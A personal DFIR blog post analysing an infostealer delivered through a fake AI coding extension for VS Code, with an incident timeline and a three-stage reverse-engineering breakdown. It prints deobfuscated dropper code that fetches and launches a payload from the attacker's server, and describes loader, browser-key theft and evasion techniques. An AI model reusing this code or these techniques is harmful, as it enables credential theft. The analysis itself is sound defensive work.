---
title: "[RE/DFIR] My Discord and Instagram Got Hijacked for the MrBeast Scam, So I Took the Malware Apart"
desc: "No cracked .exe, no fake CAPTCHA. A fake AI coding extension for VS Code stole my sessions on October 11, and the accounts were only abused 8 days later. The timeline, what it stole, and a full reverse-engineering breakdown of all three stages."
date: "10-21-2026"
lang: "en"
cover: "/mrbeast/operation-thumbnail.jpg"
alt_lang: "th"
alt_slug: "mrbeastttt-th"
tags:
  - ReverseEngineering
  - DFIR
  - MalwareAnalysis
  - Infostealer
  - CyberSecurity
---

> This article is also supported by another language: [Thai](/post/mrbeastttt-th)

# Introduction

Hey, Mind here! Back with another security post, and this one's title is basically *"how the hell did I get hit?"*

A few days ago a lot of you saw my main Discord and my Instagram spamming the MrBeast crypto casino scam. If you know me, you know I don't run cracked stuff or paste random commands from fake CAPTCHA pages. So... how?

Some people thought I downloaded some sketchy program, some thought I ran some random script. It's deeper than that. I didn't want to just wipe the PC and pretend nothing happened, so I cut the infected Windows PC off from the internet, hooked it up to my Linux laptop with a cable, found exactly where it came from, and took the malware apart all the way down to the assembly.

This post has two halves. The first half (what happened, what got stolen, what you should do) is for everyone, no tech knowledge needed. The second half is the full reverse-engineering of all three stages (`geaix-1.0.24.vsix` -> `jli.dll` -> `build.dll`) for the nerds.

## The Short Version

- **What got me:** a VS Code extension for an AI coding tool called "Geaix". Their website told me to download it as a file and install it by hand. It worked as a real AI assistant, but it also secretly downloaded and ran a password and session stealer.
- **It's not just Geaix:** the same server runs at least seven more "AI coding" sites (Ahiak, Aiqana, Axqua, Excelnt, Lebang, Plikai, Vunex) that are the exact same website with a different name. If someone sends you one of those, don't install anything from it.
- **When:** I installed it on **October 11**. The spam only started on **October 19**. The stealer had already sent everything out 8 days earlier. That's why people who get hit like this usually say *"but I didn't download anything today."*
- **What it took:** saved browser passwords, the cookies that keep you logged in to websites, Discord login tokens, Steam and Roblox sessions, autofill data (phone numbers, addresses, ID numbers), browsing history, a screenshot of my screen, and a list of my hardware and installed programs. With those cookies and tokens, the attacker didn't need my passwords or my 2FA. They were already logged in as me.
- **What I did:** kicked out every unknown session, changed passwords, logged out all devices everywhere, and wiped the infected Windows install.
- **What you should do:** see **What You Should Do** at the very end. It's a short checklist and you don't need to be technical to follow it.

> **Heads up:** this is just *one* way the MrBeast scam spreads. Not every MrBeast spam or session stealer works like this. There are tons of different stealers, delivered through all kinds of files and apps, on every kind of machine. They all end the same way, though: your session gets stolen and a bot spams your friends. This one is the one that got me, and it turned out to be really interesting to take apart, so here it is.

![My laptop with the forensic report open, the infected Windows PC behind it](/mrbeast/operation-thumbnail.avif)

---

## The Incident & Timeline (October 11 – October 19, 2026)

On **October 19, 2026 around 4:57 PM (UTC+7)**, my accounts suddenly started sending scam messages, all at once:

1. **Discord (`mindhas403` / `MindyGoesBye :3`):** Sent four fake screenshots promoting a `$3,500` / `$3,700` MrBeast crypto casino giveaway (`basoowin.com`, promo code `TAKE`) into my friends' DMs.

![My Discord account sending the MrBeast scam into a friend's DM](/mrbeast/discord-dm-scam.avif)

2. **Instagram (`MindTheNerd :3` / `mindhas403`):** Sent phishing links (`famopex.com`) to friends via DM and posted a fake MrBeast `$2,500` giveaway story (`Famopex.com`, promo code `GIFT`).

![My Instagram account sending famopex.com in DMs](/mrbeast/ig-dm-scam.avif)

![My Instagram account posting a fake MrBeast giveaway story](/mrbeast/ig-story-scam.avif)

![Meme: "Withdrawal Failed! Mr. Beast Exit Scam" next to a failed 2700 USDT transfer](/mrbeast/exit-scam-meme.avif)
> And this is how it ends if you actually sign up and try to withdraw that "bonus" :trollface:

3. Checking Discord's **Devices** tab two minutes later at **4:59 PM**, I found two unauthorized sessions:
   - `Windows · Chrome` — **Los Angeles, California, United States** (*less than an hour ago*)
   - `Windows · Discord Client` — **Cologne, North Rhine-Westphalia, Germany** (*less than an hour ago*)

![Suspicious Discord sessions from Los Angeles and Cologne](/mrbeast/discord-devices.avif)

### How the Automated Discord Spam Bot Hides Its Tracks

While I was kicking the sessions out and checking the damage, I noticed some pretty sneaky stuff the bot does once it logs in with a stolen token:

![36 ignored accounts in my Discord settings after the bot ran](/mrbeast/discord-ignored-list.avif)

1. The bot enumerates your Friend List sorted **alphabetically (A to Z)** and sends the four MrBeast images to each friend.
2. Immediately after messaging a friend, **the bot adds that friend to your `Ignored accounts` list** (`36 ignored accounts` in my screenshot before I killed the session). By ignoring every recipient, Discord suppresses their reply notifications and hides the DM thread from your main view — so when your friends reply asking if you got hacked, you never see a notification.
3. Once it finishes iterating through your entire Friend List, the bot moves on to **spamming every Discord server you are in**.

Luckily I caught it within two minutes (4:57 PM to 4:59 PM). I changed my password, which kicked the sessions out, and the bot got cut off before it finished my friend list or touched any servers. So the account didn't get flagged or disabled by Discord. Phew.

---

## Why People Say "I Didn't Download Anything": The 8-Day Gap

Remember the old "free Discord Nitro" era? There were actually two parallel scams going on back then. **One** was pure phishing: the "free Nitro" link bounced you to a **fake Steam login page**; if you typed your password, your Steam account was gone (resold or stripped for items). Nothing to do with Discord being hijacked. **The other** was the stealer version, which is the ancestor of what hit me: you ran a cracked game `.exe` from Google or a torrent, or a sketchy script a friend sent you on Discord, your computer's session got stolen, and 1–3 days later a bot used *your* Discord to spam "free Nitro" at everyone on your friends list (some of whom clicked the phishing link, and round the loop went). Even back then the stealer hid its files in `%TEMP%`, same pattern as what we just took apart. The idea hasn't changed. What's changed is that the attackers don't need you to go looking for cracks or run random scripts anymore — now it ships as a "real tool" a friend recommended.

When I pulled the filesystem timeline from my Windows 11 desktop (`YuriPC-Win11`), the infection didn't happen on October 19. It happened eight days earlier, on **October 11, 2026 at 11:57:52 PM ICT**. I installed the extension a minute later, and 36 seconds after that the stealer's files landed in `%TEMP%`:

```text
CreationTime           LastWriteTime          Length   FullName
------------           -------------          ------   --------
10/11/2026 11:57:52 PM 10/11/2026 11:57:56 PM 27124774 D:\Users\MindTheNerd\Downloads\geaix-1.0.24.vsix
10/11/2026 11:58:51 PM 10/11/2026 11:58:51 PM     2836 C:\Users\MindTheNerd\.vscode\extensions\geaix.geaix-1.0.24\.vsixmanifest
10/11/2026 11:59:27 PM 10/11/2026 11:59:27 PM    50344 C:\Users\MindTheNerd\AppData\Local\Temp\wuauclt-b38806a7\javaw.exe
10/11/2026 11:59:27 PM 10/11/2026 11:59:27 PM   736256 C:\Users\MindTheNerd\AppData\Local\Temp\wuauclt-b38806a7\jli.dll
```

### How It Got Installed
A friend told me to try a third-party AI coding tool (`geaix.com`). To use it, their dashboard (`https://geaix.com/dashboard/editor`) instructs you to download and manually install a VS Code extension package (`geaix-1.0.24.vsix`).

I did wonder why it wasn't on the official VS Code Marketplace. But I figured it was just new, and I honestly thought VS Code extensions had some kind of sandbox (they don't, lol). I was booted into Windows working on another project (`osu-somtum-patcher`) at the time, so I just installed the `.vsix` without unpacking it and checking first. Yeah, my bad. (And on October 19 at `20:10:04`, I installed the same `.vsix` into Google Antigravity too. Double my bad.)

I can't see what happened on the attacker's side between October 11 and October 19. Stolen logins like these are usually collected in bulk and sold or used later, and a gap of a week or more is normal. That gap is why victims almost always say *"I didn't download anything!"* You probably did, just not that day. It also doesn't have to be a cracked `.exe` or a fake CAPTCHA anymore. It can be a **VS Code extension, a browser extension, an app plugin, or a Minecraft mod**.

---

## Cutting the PC Off the Internet Before Investigating

First thing before touching anything: unplug the internet. As the Stage 1 and Stage 3 sections below show, this malware sends a list of every running process to its server every 3 seconds for 15 minutes after each launch (and it relaunches every time the editor opens), and it can download and run more programs whenever its server tells it to. If the PC stayed online while I was digging through it, the operator could see what I was doing and push something new.

![A single Ethernet cable from my Linux laptop's USB-C adapter into the infected Windows PC](/mrbeast/isolated-lan-setup.avif)

The setup:
1. I unplugged the Windows 11 desktop (`YuriPC-Win11`) from the internet.
2. I plugged my **Fedora Linux** laptop straight into the Windows PC with one Ethernet cable through a **GOOJODOQ USB-C Ethernet adapter**. That gives a private two-machine network (the Windows PC sits at `192.168.1.44`) with no route to the internet.
3. Over that cable only, I had AI tooling on the Fedora laptop search the Windows filesystem, export registry hives, pull the DPAPI master keys, and copy the malware files off for static and dynamic reverse engineering.

---

## Reverse Engineering the Malware Chain (`geaix.geaix-1.0.24`)

> **Not technical?** This part gets deep into code and assembly. You can scroll down to **What Was Stolen From My Machine** and **What You Should Do**.
>
> In plain words, the malware works in three layers. **(1)** The extension is a real AI coding assistant with extra code hidden at the end. When you log in, that code downloads a ZIP and runs it. **(2)** The ZIP holds a real, signed Java launcher next to a fake DLL. Windows loads the fake DLL because it sits in the same folder, so the malware runs inside a program that looks trustworthy. **(3)** The fake DLL decrypts the actual stealer straight into memory, so it never exists as a normal file on disk. The stealer collects passwords, cookies and tokens, sends them out, then stays running to swap any crypto wallet address you copy.

Okay, nerd time. The whole thing has three stages, and the point of all of them is to keep the real stealer off the disk and running inside a trusted, signed program:

- **Stage 1 (`geaix-1.0.24.vsix` -> `extension/dist/extension.js`):** A functional fork of the open-source **Kilo Code** AI assistant (`36,654,196` bytes) with a string-obfuscated Node.js dropper (`qEa` -> `Kgt`, `HEa`, `gdn`, `DEa`) appended at the tail of the bundle.
- **Stage 2 (`javaw.exe` + `jli.dll`):** A legitimate, signed **Eclipse Adoptium Temurin OpenJDK** `javaw.exe` (`50,344` bytes) used to DLL-side-load a malicious unsigned `jli.dll` (`736,256` bytes, internal PE export name `loader.dll`). `jli.dll` is obfuscated with control-flow flattening (CFF) and reflectively maps Stage 3 into a single RWX memory region.
- **Stage 3 (`build.dll`):** A PE64 DLL (`607,744` bytes once rebuilt, `SizeOfImage` `0x9b000`) stored inside `jli.dll` as encoded text and decoded straight into RAM (custom 64-character alphabet + LZ77). It implements anti-VM checks, a CIS/post-Soviet locale killswitch, a hidden-desktop thread-hijacking bypass for Chrome `v20` App-Bound Encryption, Gecko/Discord/Steam/Roblox credential harvesting, a secondary payload runner, and a cryptocurrency clipboard clipper.

![Full Geaix VS Code Extension Attack Chain Flowchart](/mrbeast/attack-flow.avif)

---

### Stage 1: Analysis of the Trojanized `.vsix` Dropper (`extension.js`)

A `.vsix` is just a ZIP file, so I unzipped `geaix-1.0.24.vsix` (`27,124,774` bytes, SHA-256 `02cd28dc0a9c1ee109462aa6942dfbc3bdb1af9210315eaa326e73e49d01ac0d`) and the `extension.vsixmanifest` says publisher `geaix`, version `1.0.24`, and `GalleryFlags: Public`.

The pre-tail portion of `extension/dist/extension.js` (`disasm/geaix_pre_tail_deobfuscated.js`, 76 functions) is the genuine Kilo Code extension (`sidebarProvider.getTaskWithId`, `createTask`, `postMessageToWebview`, etc.) rebranded under the `geaix.*` command namespace. They even wrote a fake `extension/changelog.md` with 9 releases from `1.0.0` to `1.0.24`. This one from `1.0.5` is kinda sus:
> `1.0.5 — Maintenance release: infrastructure move to a new host, no user-facing changes.`

#### Persistence via IDE Activation Events
No Registry `Run` keys, no Startup folder, no Scheduled Tasks. It doesn't need any of that, because `extension/package.json` already has this:
```json
"activationEvents": [
  "onLanguage",
  "onStartupFinished"
]
```
Every time VS Code or Antigravity starts up, the extension host invokes `activate(context)` -> `qEa(context)`. At the end of `qEa`, the extension schedules the dropper `Kgt` and also hooks `context.secrets.onDidChange` so that if the user wasn't logged in at startup, the dropper fires the exact moment they sign into the Geaix sidebar:

```js
// Deobfuscated from extension/dist/extension.js (lines 929–939)
return HXr(), Kgt(context, Bg()).catch(() => {}),
  context.subscriptions.push(
    context.secrets.onDidChange((event) => {
      if (event.key === "geaix.account.token") {
        Kgt(context, Bg()).catch(() => {});
      }
    })
  ),
  new PGe(G0, sidebarProvider, ipcSocketPath, hasIpcSocket);
```

#### Inside the Stage 1 Dropper (`Kgt`, `PEa`, `MEa`)
The tail of `extension.js` is obfuscated with a rotating string array (`_0x1dc9`). After decoding it, this is what `Kgt(context, baseUrl)` actually does:

1. **Platform & Token Gate:**
   Checks `process.platform === "win32"` and reads `await context.secrets.get("geaix.account.token")`. Without a valid login token, `Kgt` exits cleanly (`skip: no token yet, waiting for login`).
2. **Fetching Payload Metadata (`/api/vscode/software/pick`):**
   Issues a `GET` request (timeout `TEa = 20,000 ms`) to `https://geaix.com/api/vscode/software/pick?platform=win` with headers:
   ```js
   {
     "x-geaix-client": "vscode",
     "x-geaix-feat": "zip",
     "authorization": "Bearer " + token
   }
   ```
   The endpoint returns `{ pick: { id, sha256, name, fileType: "zip", entry: "javaw.exe" } }`.
3. **GlobalState Cache Hit Check:**
   Reads `context.globalState.get("geaix.partnerSoftware.lastSha256")` (`Idn`) and `context.globalState.get("geaix.partnerSoftware.lastPath")` (`qgt`). If the binary already exists in `%TEMP%` and its SHA-256 matches the server's hash, it logs `cache hit` and skips straight to execution.
4. **Decoy Directory Generation (`PEa`) & Zip Extraction (`MEa`):**
   On a cache miss, it downloads the ZIP from `GET /api/vscode/software/download/<id>` (timeout `VEa = 60,000 ms`), verifies the SHA-256 buffer hash (`vdn`), and picks a decoy directory name in `%TEMP%` using `PEa()`. The prefix is selected via `crypto.randomBytes(16)[0] % 12` from the 12-element array `o4e`:
   ```js
   const o4e = [
     "setup", "update", "installer", "svchost", "wuauclt", "msupdate",
     "sysprep", "runtime", "winhlp", "tmp", "pkg", "wsc"
   ];
   ```
   Followed by `-` or `_` and 4–7 random hex bytes. On `YuriPC-Win11`, this produced:
   `C:\Users\mindthenerd\AppData\Local\Temp\wuauclt-b38806a7\`
   Interestingly, the zip extractor `MEa` (built on `yauzl`) explicitly guards against Zip Slip path traversal (`if (rel.startsWith('..') || path.isAbsolute(rel)) return;`) before writing `javaw.exe`, `jli.dll`, and `vcruntime140.dll`.
5. **Detached Execution:**
   ```js
   let child = child_process.spawn(
     "cmd.exe",
     ["/c", "start", "", "/B", entryPath],
     { cwd: extractDir, detached: true, stdio: "ignore", windowsHide: true }
   );
   child.unref();
   ```
6. **15-Minute WebSocket Surveillance Loop (`gdn` & `DEa`):**
   Immediately after spawning `javaw.exe`, the extension reports the new PID to `POST /api/vscode/software/started` (`HEa`) and opens a WebSocket to `wss://geaix.com/api/ws?client=vscode&token=<token>`. For `YEa = 900,000 ms` (15 minutes), it runs `DEa` every `WEa = 3,000 ms` (3 seconds):
   ```js
   // Deobfuscated from DEa() in extension/dist/extension.js (lines 232–249)
   child_process.exec(
     'powershell.exe -NoProfile -Command "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine | ConvertTo-Json -Compress"',
     { timeout: 4000, windowsHide: true, maxBuffer: 4 * 1024 * 1024 },
     (err, stdout) => { ... }
   );
   ```
   Notably, `_Ea()` filters out its own noisy `get-ciminstance win32_process`, `wmic process`, and `conhost.exe` entries before batching the process tree and `%TEMP%` / `%APPDATA%` / `%LOCALAPPDATA%` / `%PROGRAMDATA%` / `C:\Users\Public` file-change deltas (`pdn` / `ZEa`, capped at `hdn = 10` filenames per tick, `OEa = 200` chars per command line) into `{"type": "log/batch", "items": [...]}` WebSocket frames.

---

### Stage 2: DLL Side-Loading, Control-Flow Flattening & Reflective Loader (`jli.dll`)

In the staging directory `%TEMP%\wuauclt-b38806a7\`, `javaw.exe` (`50,344` bytes, SHA-256 `ca798475...`) is a genuine, unmodified **Eclipse Adoptium Temurin OpenJDK** launcher signed by `CN = Eclipse.org Foundation, Inc.`.

Because `javaw.exe` links against `jli.dll`, the Windows loader resolves `jli.dll` from the application directory before searching system paths. The attacker's `jli.dll` (`736,256` bytes, SHA-256 `d76e906a...`) is unsigned.

#### PE Header & Toolchain Forensics
Just looking at the PE headers of `jli.dll` and the unpacked Stage 3 (`build.dll`) already gives away a lot:

1. **Internal Export Name Mismatch:**
   The PE Export Directory (`IMAGE_EXPORT_DIRECTORY.Name`) inside `jli.dll` is **`loader.dll`**, not `jli.dll`. It exports 7 functions matching the OpenJDK JLI interface so the PE loader succeeds:
   ```text
   JLI_CmdToArgs         @ 0x180005206
   JLI_GetStdArgc        @ 0x180006099
   JLI_GetStdArgs        @ 0x180004875
   JLI_InitArgProcessing @ 0x180003809
   JLI_Launch            @ 0x18000477b  <-- Primary entry point called by javaw.exe
   JLI_MemAlloc          @ 0x180006616
   JLI_MemFree           @ 0x1800051f1
   ```
2. **Correlated Compile Timestamps (14 Seconds Apart):**
   | Binary | PE `TimeDateStamp` | UTC Timestamp | Rich Header |
   |---|---|---|---|
   | `build.dll` (Stage 3) | `0x6acb8e11` | `2026-10-11 13:24:33 UTC` | Stripped / Absent |
   | `jli.dll` (`loader.dll`) | `0x6acb8e1f` | `2026-10-11 13:24:47 UTC` | Stripped / Absent |

   Stage 3 (`build.dll`) was compiled first at `13:24:33 UTC`, encoded and embedded into Stage 2's `.rdata` section, and `jli.dll` was compiled **14 seconds later** at `13:24:47 UTC` — roughly 3.5 hours before I downloaded the VSIX that same night. Both malicious DLLs have their MSVC Rich headers stripped, whereas the legitimate `javaw.exe` and `vcruntime140.dll` retain intact Rich headers.
3. **Minimal Import Table:**
   `jli.dll` only imports standard CRT bootstrap routines from `kernel32.dll` and `api-ms-win-core-synch-l1-2-0.dll`. Everything else it needs (`VirtualAlloc`, `LoadLibraryA`, `GetProcAddress`, `GetSystemMetrics`, `GetLogicalDrives`, `Sleep`, `RtlGetCurrentPeb`) is stored as encoded strings and resolved at runtime.

#### Disassembly of `JLI_Launch` (`0x18000477b`) & Control-Flow Flattening
When `javaw.exe` calls `JLI_Launch` at `0x18000477b`, the function first inspects Thread Local Storage (`gs:0x58`) and verifies a magic state value (`0x93e329d8`):

```x86asm
18000477b:  56                      push   rsi
18000477c:  57                      push   rdi
18000477d:  53                      push   rbx
18000477e:  48 81 ec 90 01 00 00    sub    rsp, 0x190
180004785:  8b 05 89 e6 0a 00       mov    eax, DWORD PTR [rip+0xae689]    # TLS index @ 0x1800b2e14
18000478b:  65 48 8b 0c 25 58 00    mov    rcx, QWORD PTR gs:0x58          # TEB->ThreadLocalStoragePointer
180004792:  00 00
180004794:  48 8b 04 c1             mov    rax, QWORD PTR [rcx+rax*8]
180004798:  48 8d 80 70 00 00 00    lea    rax, [rax+0x70]
18000479f:  8b 00                   mov    eax, DWORD PTR [rax]
1800047a1:  48 8d 74 24 32          lea    rsi, [rsp+0x32]
1800047a6:  3d d8 29 e3 93          cmp    eax, 0x93e329d8
1800047ab:  0f 85 b0 00 00 00       jne    0x180004861
```

Throughout `.text` (`0x180001000` – `0x180014fff`), `jli.dll` is heavily obfuscated with **OLLVM-style Control-Flow Flattening (CFF)** using relative jump-table dispatchers and **Mixed Boolean-Arithmetic (MBA)** expressions. Instead of normal `call`/`ret` or linear branches, basic blocks end by computing a state index with `sete`/`cmove`/`cmovb`, looking up a signed 32-bit offset in a table at `.rdata` (`0x1800a7000+`), adding the base register (`r9`, `r12`, or `r13`), and executing an indirect register jump (`jmp r10` / `jmp r11` / `jmp rcx`):

```x86asm
180001315:  41 bb fb 2e 6e d7       mov    r11d, 0xd76e2efb
18000131b:  45 2b df                sub    r11d, r15d
18000131e:  45 31 d2                xor    r10d, r10d
180001321:  45 8b db                mov    r11d, r11d
180001324:  4c 39 da                cmp    rdx, r11
180001327:  41 0f 94 c2             sete   r10b
18000132b:  41 c1 e2 06             shl    r10d, 0x6
18000132f:  4f 63 9c 0a b8 01 00 00 movsxd r11, DWORD PTR [r10+r9*1+0x1b8]
180001337:  4d 03 dd                add    r11, r13
18000133a:  41 ff e3                jmp    r11
```

After going through that mess of a state machine, it really only does three things:

1. **Decode Stage 3 from text (`0x18000494d`):**
   - Stage 3 isn't encrypted with a real cipher. It sits in `.rdata` at `0x180016159` as a `594,786`-character text blob. The same codec is used for all 23 strings in `jli.dll`: each character is looked up in a custom 64-character alphabet at `0x1800a78b0`, shifted by a per-item key (`shift = (-key) & 0x3f`), and the 6-bit values are packed back into bytes.
   - A second, smaller blob at `0x1800a75f2` (`458` characters) holds the `0x400`-byte PE header, with the `MZ` and `PE` signatures zeroed out so a memory scanner looking for them won't find anything.
2. **LZ77 decompression:**
   - The decoded bytes are an LZ77 stream (`off = (w >> 5) + 1`, `len = (w & 0x1f) + 4`). Decompressing gives the `606,720`-byte (`0x94200`) section data of a PE64 DLL whose internal export name is **`build.dll`**. None of it touches the disk.
3. **Reflective PE mapping (`0x180001110`):**
   - Calls `VirtualAlloc(NULL, 0x9B400, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)` at `0x180001abe`. That's one RWX region for the whole image, which is itself a strong memory-forensics signal.
   - Copies the `0x400`-byte header (`0x180001358: mov edx, 0x400`), writes the `MZ`/`PE` bytes back at offset `0` and `e_lfanew` (`0x40`), and lays out all **8 sections** of `build.dll` (`SizeOfImage` `0x9b000`, `0x180001348: mov r8d, 0x9b000`). The flags column is what each section header declares; the loader ignores them and leaves everything RWX:

   | Section | Virtual Address | Virtual Size | Raw Offset | Raw Size | Header flags |
   |---|---|---|---|---|---|
   | `.text` | `0x1000` | `0x766f6` | `0x400` | `0x76800` | `r-x` (`PAGE_EXECUTE_READ`) |
   | `.rdata` | `0x78000` | `0x15244` | `0x76c00` | `0x15400` | `r--` (`PAGE_READONLY`) |
   | `.data` | `0x8e000` | `0x59a0` | `0x8c000` | `0x5000` | `rw-` (`PAGE_READWRITE`) |
   | `.pdata` | `0x94000` | `0x2010` | `0x91000` | `0x2200` | `r--` |
   | `.fptable` | `0x97000` | `0x100` | `0x93200` | `0x200` | `rw-` |
   | `.tls` | `0x98000` | `0x241` | `0x93400` | `0x400` | `rw-` |
   | `_RDATA` | `0x99000` | `0x444` | `0x93800` | `0x600` | `r--` |
   | `.reloc` | `0x9a000` | `0x714` | `0x93e00` | `0x800` | `r--` |

   - Resolves **94** imports from a table of `[HintName_RVA, IAT_RVA]` pairs at `0x180015020` (via `LoadLibraryA` / `GetProcAddress`), applies **855** relocations from the list at `0x1800153c8`, and plants a fake `LDR_DATA_TABLE_ENTRY` at `base + 0x9B000` named `"\x01!OyZ.dll"` (`DllBase` = base, `EntryPoint` = `base + 0x755f0`, `SizeOfImage` = `0x9B000`) so the image looks like a loaded module. It then calls the entry point **once**, at `0x180003141` (`call [rsp+0x128]`), with `(base, DLL_PROCESS_ATTACH, 0)`. No other export is called.

---

### Stage 3: Reverse Engineering `build.dll` (In-Memory Infostealer, Clipper & Loader)

Dumping the Stage 3 image from memory and rebuilding the PE (`unpacked_build_full.dll`, `607,744` bytes, SHA-256 `dd81a7c12465d70e85e59ee49c1ed9fe4c9b4d2d65ea4b7e1857b84985444653`) lets us disassemble its `.text` section (`0x180001000` – `0x1800776f6`). The code looks like it was **compiled from Rust** (Rust-style allocator/drop glue, `WaitOnAddress`-based `Once` primitives — the same patterns as `jli.dll`), with `DllCharacteristics = 0x100` (`NX_COMPAT` only — no ASLR or CFG flags needed since it is always reflectively mapped).

#### 1. String Encryption (`0x180031d4a`) & XOR-Encoded C2 Table
If you run `strings` on `build.dll` you get basically nothing, because all **512 strings** it uses in `.rdata` are encoded.

Each string entry uses a two-layer encoding:
1. **Per-string rotated Base64 alphabet:** Each entry carries a shift value (`shift ∈ [1, 63]`) that rotates a custom 64-character Base64 lookup table before decoding.
2. **LZ77 decompression:** The Base64-decoded byte stream is decompressed with LZ77 into a stack buffer at runtime.

I wrote a decoder for all 512 of them (`disasm/payload_decoded_strings_all.txt`) and everything came out clean. Some of my favorites, with addresses and shift values (yes, the dev left a Russian insult in there, translated: "fuck the rats, I don't like these snitches"):

```text
0x180078f99 (shift=40): '.cmd'
0x180078fa6 (shift=39): 'POST'
0x180079027 (shift=28): 'GetClipboardSequenceNumber\x00'
0x1800791d8 (shift=12): 'CryptUnprotectMemory\x00'
0x1800796c3 (shift=17): 'Thread32First\x00'
0x180079739 (shift=12): '\t.ROBLOSECURITY\t'
0x1800797fc (shift=63): 'CreateProcessWithTokenW\x00'
0x180079c0d (shift= 2): 'SuspendThread\x00'
0x180079cae (shift=26): 'WriteProcessMemory\x00'
0x18007a20c (shift= 9): 'SetThreadContext\x00'
0x18007c3ba (shift= 1): 'your lovely warden\x00'
0x18007cdcb (shift=14): 'нахуй крыс, я не люблю этих снитчей'
```

Meanwhile, the C2 servers and campaign UUID are stored separately in `.rdata`, single-byte XOR-encoded. The C2 table at `0x1800785c0` has three `{XOR key, pointer, length}` entries that the main routine tries in order, and the port (`443`) is hardcoded at the `WinHttpConnect` call:

| Artifact | Virtual Address | XOR Key | Decoded Value |
|---|---|---|---|
| Primary C2 | `0x18007e4ed` | `0x8d` | **`dtapi.cc`** (`HTTPS/443`) |
| Secondary C2 | `0x18007d214` | `0xe5` | **`x1zsp.cc`** (`HTTPS/443`) |
| Tertiary C2 | `0x180079451` | `0xd9` | **`cfmlapi.cc`** (`HTTPS/443`) |
| Campaign / Botnet UUID | `0x18007c6ff` | `0x43` | **`01a12b22-5ca2-7f90-849a-8304fc081a08`** |

All Win32 API calls inside `build.dll` go through a dynamic resolver helper at **`0x18004417a`**, which takes a decrypted DLL name (e.g., `'crypt32.dll\x00'`, `'bcrypt.dll\x00'`, `'winhttp.dll\x00'`) and function name, resolving them on the fly via `LoadLibraryA` / `GetProcAddress`.

#### 2. Complete Function Map of `build.dll`

| Function VA Range | Size | Purpose & Key Decoded Strings / APIs |
|---|---|---|
| `0x18002a15e..0x18002e2bc` | `0x415e` | **Main Orchestrator & Exfiltration:** Calls anti-VM (`0x18001f879`), CIS locale check (`0x180055579`), harvesting modules, `RtlCompressBuffer` (`0x180015a54`), and `POST /` to C2. Contains the Russian taunt `'нахуй крыс, я не люблю этих снитчей'`. |
| `0x18001f879..0x1800210b0` | `0x1837` | **Anti-Hypervisor / VM Check:** Compares CPUID vendor strings against about 30 hypervisor signatures (`VMwareVMware`, `VBoxVBoxVBox`, `XenVMMXenVMM`, `prl hyperv`, `TCGTCGTCGTCG`, `bhyve bhyve`, `HAXMHAXMHAXM`, `IntelTDX    `, `Linux KVM Hv`, `NoirVisor ZT`, etc.) plus display adapters (`Virtio`, `Standard VGA`, `Basic Display`). |
| `0x180055579..0x18005b3a5` | `0x5e2c` | **CIS Locale Killswitch & System Fingerprinting:** Checks `GetUserDefaultLocaleName`, `LCIDToLocaleName`, and `HKCU\Keyboard Layout\Preload` against `uk, uz, az, hy, tg, tk, ky, kk, be, ru, ro-md`. Collects OS version (`RtlGetVersion`), CPU/RAM (`GetSystemInfo`, `GlobalMemoryStatusEx`), GPU (`EnumDisplayDevicesW`), disk serial (`GetVolumeInformationW`), and enumerates `HKLM\...\Uninstall` (both 64-bit and `WOW6432Node`). |
| `0x180004082..0x180006eec` | `0x2e6a` | **Chromium Browser Orchestrator:** Walks `%LOCALAPPDATA%` and `%APPDATA%` for `User Data\(Default|Profile *)` across all Chromium browsers (Chrome, Brave, Edge, Vivaldi, Opera). Targets `Local State`, `Login Data`, `Login Data For Account`, `logins_alt`, `Web Data`, `History`, `Preferences`, `Network\Cookies`, and `Local Storage\leveldb`. |
| `0x1800634a3..0x1800643a5` | `0x0f02` | **Chrome `v20` ABE Hidden Desktop Setup:** Parses `Local State` for `app_bound_encrypted_key` and creates an invisible desktop via `user32!CreateDesktopA` (`CloseDesktop` on teardown). |
| `0x1800601c8..0x1800620d2` | `0x1f0a` | **Interactive Token Impersonation Launcher:** Finds Explorer's PID via `GetShellWindow` -> `GetWindowThreadProcessId`, calls `OpenProcess` -> `OpenProcessToken` -> `DuplicateTokenEx`, and spawns the target browser via `CreateProcessWithTokenW` so DPAPI keys match the logged-in user. |
| `0x18000b161..0x180013537` | `0x83d6` | **Chrome `v20` ABE Process Injector & Key Scraper:** Enumerates processes/threads (`NtQuerySystemInformation`, `CreateToolhelp32Snapshot`, `Thread32First`/`Next`), opens the browser (`OpenProcess`, `OpenThread`), hijacks a thread (`SuspendThread`, `GetThreadContext`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread`), and scans memory (`VirtualQueryEx`, `ReadProcessMemory`, `CryptUnprotectMemory`) to extract the decrypted `v20` `master_encryption_key`. |
| `0x18003ec1c..0x180040ccc` | `0x20b0` | **Browser Extension Harvester:** Collects `\Local Extension Settings` and `\Extensions`, skipping anything whose name or ID matches the `5,390`-char blacklist at `0x18007aace` (276 entries: ad-blockers, AV/security add-ons, productivity tools, 60 raw extension IDs). Everything else is stolen, which is how wallet and 2FA extensions get hit. There is no wallet-specific ID list. |
| `0x1800423cc..0x180043db3` | `0x19e7` | **Gecko / Firefox / Zen Browser Harvester:** Targets `%APPDATA%\<browser>\Profiles\*`, stealing `key4.db`, `logins.json`, `logins.db`, `cookies.sqlite`, `places.sqlite`, `formhistory.sqlite`, `autofill-profiles.json`, and `storage\default`. |
| `0x180044cf6..0x18004e929` | `0x9c33` | **Discord, Steam & Roblox Credential Engine:** Scans Discord `Local Storage\leveldb\*.ldb` & `.log` for `dQw4w9WgXcQ:`, unwraps `Local State` `encrypted_key` via `CryptUnprotectData` (`0x18002ea17`), and decrypts tokens via `bcrypt!BCryptOpenAlgorithmProvider("AES")` + `ChainingModeGCM` + `BCryptDecrypt` into `tokens.txt` (`0x180053091`). Also harvests Steam (`SteamPath`, `config\config.vdf`, `Steam\local.vdf` `ConnectCache`) and calls the Roblox module (`0x18001c972`). |
| `0x18001c972..0x18001d651` | `0x0cdf` | **Roblox `.ROBLOSECURITY` Extractor:** Reads `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat`, parses `CookiesData`, base64-decodes via `CryptStringToBinaryA` (`0x1800345be`), and unwraps DPAPI via `CryptUnprotectData`. |
| `0x18005c9f6..0x18005e5b5` | `0x1bbf` | **Native-DPI Screenshot Capture:** Calls `SetProcessDPIAware` -> `GetSystemMetrics` -> `GetDC(NULL)` -> `CreateCompatibleDC` -> `CreateCompatibleBitmap` -> `BitBlt` -> `GetDIBits` and prepends a `BM` BMP header. |
